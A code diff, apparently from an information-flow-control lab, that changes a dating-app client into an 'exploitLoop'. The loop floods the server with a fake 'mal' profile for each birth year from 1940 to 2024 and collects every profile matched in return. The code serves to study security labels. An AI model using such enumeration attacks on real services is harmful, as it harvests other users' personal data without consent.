@@ -3,30 +3,69 @@
    
 import lists
 let 
-   fun client () =
-      let val _ = receive [hn ("NEWMATCH", _)
-            => (printString "New match received")
+   fun client profiles =
+      let val _ = receive [hn ("NEWMATCH", matchProfile)
+            => let 
+                  val _ = print ("New match received: ", matchProfile)
+               in
+                  client (matchProfile :: profiles)
+               end
          ]
-      in client ()
+      in 
+         (* We should never reach this *)
+         client profiles
       end
 
-   fun rejectAll _ =
-      (false, ())
+   fun acceptAllExceptSelf profile =
+      let
+         val (_, name, _, _, _) = profile
+      in
+         if 
+            name = "mal"
+         then
+            (false, ())
+         else
+            (true, ())
+
+      end
+
+   fun sendProfile (profile, agent, pid) =
+      let 
+         val datingServer = whereis ("@datingServer", "datingServer")
+         val data = ("NEWPROFILE", (profile, agent, pid))
+      in
+         send (datingServer, data)
+      end
+
+   fun exploitLoop (i, pid) =
+      let
+         val _ = sleep 200
+         val securityLevel = `{mal}`
+         val name = "mal" raisedTo `{mal}`
+         val yearOfBirth = i raisedTo `{mal}`
+         val isFemale = false raisedTo `{mal}`
+         val interests = ["Gaming", "Lovin"] raisedTo `{mal}`
+         
+         val profile = (securityLevel, name, yearOfBirth, isFemale, interests)
+         
+         val _ = sendProfile (profile, acceptAllExceptSelf, pid)
+
+      in
+         if 
+            i < 2025
+         then
+            exploitLoop (i + 1, pid)
+         else
+            print("Exploit loop finished")
+      end
 
    fun main () =       
-      let val thisNode = node (self ())
-          val _ = printString ("Running node with identifier: " ^ thisNode)
-          val _ =  register ("datingClient", spawn client, authority)
-          val securityLevel = `{mal}`
-          val name = "mal" raisedTo `{mal}`
-          val yearOfBirth = 1999 raisedTo `{mal}`
-          val isFemale = false raisedTo `{mal}`
-          val interests = ["Hiking", "Biking"] raisedTo `{mal}`
-          val profile = (securityLevel, name, yearOfBirth, isFemale, interests)
-          val _ = printWithLabels ("Profile: ", profile)
-          val datingServer = whereis ("QmWoe9ofTc42sjuueJiw6YcAYVq9Yi6DVijjoZTYZhiehr", "datingServer")
+      let
+         val pid = spawn (fn () => client([]))
+         val _ = print ("Running node with identifier: ", pid)
+         val _ =  register ("datingClient", pid, authority)
       in
-         send (datingServer, ("NEWPROFILE", (profile, rejectAll, thisNode)))
+         exploitLoop (1940, pid)
       end
 in 
    main ()
